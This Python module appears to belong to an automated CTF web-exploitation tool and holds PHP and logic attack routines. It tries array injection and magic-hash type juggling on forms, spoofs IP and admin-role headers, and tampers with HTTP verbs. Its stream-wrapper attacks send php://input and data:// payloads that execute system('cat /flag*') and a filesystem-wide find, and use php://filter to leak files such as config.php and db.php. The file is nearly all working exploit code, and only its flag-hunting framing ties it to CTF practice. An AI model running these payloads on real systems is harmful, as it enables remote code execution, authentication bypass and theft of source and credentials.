"""
PHP & Logic Vulnerabilities Engine for WebCTF Suite.
Handles PHP Type Juggling, Magic Hashes, Array Injection, HTTP Header Spoofing,
HTTP Verb Tampering, PHP Wrapper RCE/LFI, and PHP Source Leak Extraction.
"""

import re
import base64
import requests
from typing import Dict, List, Any, Optional, Tuple
from core.ui import print_info, print_success, print_warning, print_error, print_flag
from core.utils import find_flags

# Common PHP Magic Hashes (MD5 and SHA1 hashes starting with 0e followed only by digits)
MAGIC_HASHES_MD5 = [
    ("240610708", "0e462097431906509019562988736854"), # md5('240610708') == 0
    ("QNKCDZO", "0e830400451993494058024219903391"),   # md5('QNKCDZO') == 0
    ("s878926199a", "0e545993274517709982583250501300"),
    ("s155964671a", "0e342768416822451524974117254469"),
    ("s214587387a", "0e848240448830537924465865611904"),
]

MAGIC_HASHES_SHA1 = [
    ("aaroZmOk", "0e66507019969427134833325330130582021235"),
    ("aaK1STYX", "0e76658526655756207688270559625897701081"),
    ("aaO8zKZF", "0e89252659868345339634951640263299361612"),
    ("aa3OY8R4", "0e87561042734366150614193852909737782724"),
]

# Spoofing & Bypass HTTP Headers
SPOOF_IP_HEADERS = [
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Real-IP",
    "X-Client-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
    "Client-IP",
    "X-Originating-IP",
    "X-Custom-IP-Authorization",
    "True-Client-IP",
    "CF-Connecting-IP"
]

ADMIN_ROLE_HEADERS = [
    ("X-Admin", "1"),
    ("X-Admin", "true"),
    ("Admin", "1"),
    ("Admin", "true"),
    ("X-Role", "admin"),
    ("X-User-Role", "admin"),
    ("X-Authenticated-User", "admin"),
    ("Authorization-Role", "administrator")
]

class PHPTricksEngine:
    """Automated engine for PHP-specific behavioral flaws and logic vulnerabilities."""

    @staticmethod
    def test_type_juggling_form(session: requests.Session, form: Dict[str, Any], flag_checker) -> List[str]:
        """Test array injection (param[]=) and magic hash payloads on forms."""
        captured = []
        action = form.get("action", "")
        method = form.get("method", "POST").upper()
        inputs = [i.get("name") for i in form.get("inputs", []) if i.get("name") and i.get("type") not in ["submit", "button"]]

        if not inputs:
            return captured

        print_info(f"Testing PHP Type Juggling & Array Injection on form [bold cyan]{action}[/bold cyan]...")

        # 1. Array Parameter Injection (strcmp/md5 bypass: param[]=xxx)
        array_data = {}
        for inp in inputs:
            array_data[f"{inp}[]"] = "admin_array_test"
            array_data[inp] = "admin"

        try:
            if method == "POST":
                r_arr = session.post(action, data=array_data, timeout=5)
            else:
                r_arr = session.get(action, params=array_data, timeout=5)
            
            flag_checker(r_arr.text, f"PHP Array Injection ({action})")
            if any(k in r_arr.text.lower() for k in ["flag", "welcome", "admin", "dashboard", "success", "congrat"]):
                print_success(f"Potential Type Juggling / Array bypass on [bold yellow]{action}[/bold yellow]!")
        except Exception:
            pass

        # 2. Magic Hash Testing (0e... vs 0e...)
        for plain_txt, _ in MAGIC_HASHES_MD5[:3]:
            m_data = {inp: plain_txt for inp in inputs}
            try:
                if method == "POST":
                    r_hash = session.post(action, data=m_data, timeout=5)
                else:
                    r_hash = session.get(action, params=m_data, timeout=5)
                flag_checker(r_hash.text, f"PHP Magic Hash ({action})")
            except Exception:
                pass

        # 3. JSON Type Juggling ({"password": true}, {"token": 0})
        for bool_val in [True, 0, "0", []]:
            json_payload = {inp: bool_val for inp in inputs}
            try:
                r_json = session.post(action, json=json_payload, timeout=5)
                flag_checker(r_json.text, f"PHP JSON Type Juggling ({action})")
            except Exception:
                pass

        return captured

    @staticmethod
    def test_header_spoofing(session: requests.Session, target_url: str, flag_checker) -> bool:
        """Test IP spoofing and Admin role headers on target URL."""
        print_info(f"Testing HTTP Header Spoofing (IP & Admin headers) on [bold cyan]{target_url}[/bold cyan]...")
        
        # 1. IP Spoofing Headers
        for ip in ["127.0.0.1", "localhost", "10.0.0.1", "192.168.1.1"]:
            for header_name in SPOOF_IP_HEADERS:
                try:
                    headers = {header_name: ip}
                    r = session.get(target_url, headers=headers, timeout=4)
                    if flag_checker(r.text, f"Header Spoofing ({header_name}: {ip})"):
                        print_success(f"Flag captured via Header Spoofing -> [bold green]{header_name}: {ip}[/bold green]!")
                        return True
                except Exception:
                    pass

        # 2. Admin Role Headers
        for h_name, h_val in ADMIN_ROLE_HEADERS:
            try:
                headers = {h_name: h_val}
                r = session.get(target_url, headers=headers, timeout=4)
                if flag_checker(r.text, f"Admin Header ({h_name}: {h_val})"):
                    print_success(f"Flag captured via Admin Header -> [bold green]{h_name}: {h_val}[/bold green]!")
                    return True
            except Exception:
                pass

        return False

    @staticmethod
    def test_verb_tampering(session: requests.Session, target_url: str, flag_checker) -> bool:
        """Test HTTP Verb Tampering (POST/HEAD/PUT/OPTIONS/PATCH)."""
        print_info(f"Testing HTTP Verb Tampering on [bold cyan]{target_url}[/bold cyan]...")
        methods = ["POST", "HEAD", "PUT", "PATCH", "OPTIONS"]
        for m in methods:
            try:
                r = session.request(m, target_url, timeout=4)
                if flag_checker(r.text, f"HTTP Verb Tampering ({m})"):
                    print_success(f"Flag captured via HTTP Method [bold green]{m}[/bold green]!")
                    return True
            except Exception:
                pass
        return False

    @staticmethod
    def test_php_wrappers(session: requests.Session, target_url: str, parameters: List[str], flag_checker) -> bool:
        """Test php://input, data://, and expect:// wrappers for RCE / LFI."""
        print_info("Testing PHP Stream Wrappers (php://input, data://, php://filter)...")
        test_params = parameters if parameters else ["file", "page", "include", "view", "path", "doc", "url"]

        for param in test_params:
            # 1. php://input RCE
            try:
                r_inp = session.post(
                    f"{target_url}?{param}=php://input",
                    data="<?php echo '---START---'; system('cat /flag* || cat /flag.txt || find / -name *flag* 2>/dev/null'); echo '---END---'; ?>",
                    timeout=5
                )
                if flag_checker(r_inp.text, f"PHP Wrapper php://input ({param})"):
                    return True
            except Exception:
                pass

            # 2. data:// text/plain base64
            php_code_b64 = base64.b64encode(b"<?php system('cat /flag* || cat /flag.txt'); ?>").decode()
            data_wrapper = f"data://text/plain;base64,{php_code_b64}"
            try:
                r_data = session.get(target_url, params={param: data_wrapper}, timeout=5)
                if flag_checker(r_data.text, f"PHP Wrapper data:// ({param})"):
                    return True
            except Exception:
                pass

            # 3. php://filter base64 leak of standard PHP files
            for target_file in ["index.php", "config.php", "admin.php", "login.php", "db.php", "flag.php"]:
                filter_pay = f"php://filter/convert.base64-encode/resource={target_file}"
                try:
                    r_filt = session.get(target_url, params={param: filter_pay}, timeout=4)
                    b64_matches = re.findall(r"[A-Za-z0-9+/=]{40,}", r_filt.text)
                    for b64 in b64_matches:
                        try:
                            decoded = base64.b64decode(b64).decode("utf-8", errors="ignore")
                            if "<?php" in decoded or "flag" in decoded.lower():
                                print_success(f"PHP Source Code Leaked via php://filter ({target_file})!")
                                flag_checker(decoded, f"PHP Leaked Source ({target_file})")
                        except Exception:
                            pass
                except Exception:
                    pass

        return False
